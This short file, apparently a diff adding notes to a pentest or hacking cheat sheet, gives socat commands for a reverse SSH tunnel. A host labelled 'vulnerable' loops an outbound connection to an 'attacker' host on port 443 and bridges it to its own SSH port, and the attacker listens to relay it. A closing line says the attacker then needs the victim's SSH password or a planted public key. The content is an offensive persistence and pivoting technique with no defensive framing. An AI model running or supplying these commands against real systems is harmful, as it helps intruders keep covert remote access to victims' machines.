@@ -1,0 +1,4 @@
+attacker $ sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr
+vulnerable $ while true; do socat TCP4:attacker:443 TCP4:127.0.0.1:22 ; done
+
+attacker need victims ssh password or he can transfer ssh public key and authenticate 
